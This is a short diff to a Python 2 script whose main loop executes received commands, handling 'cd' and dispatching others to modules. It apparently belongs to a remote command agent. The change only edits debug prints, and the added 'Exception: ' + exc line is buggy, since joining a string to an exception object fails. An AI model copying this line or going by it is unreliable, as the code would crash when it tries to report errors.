@@ -68,7 +68,7 @@ def main(args):
             cmdargs = command.split(" ")
             if command:
                 if settings.DEBUG:
-                    print command
+                    print "Command: " + command
                 if cmdargs[0] == "cd":
                     os.chdir(os.path.expandvars(" ".join(cmdargs[1:])))
                 elif cmdargs[0] in MODULES:
@@ -87,7 +87,7 @@ def main(args):
         except Exception, exc:
             is_idle = True
             if settings.DEBUG:
-                print exc
+                print "Exception: " + exc
 
 if __name__ == "__main__":
     main(sys.argv[1:])
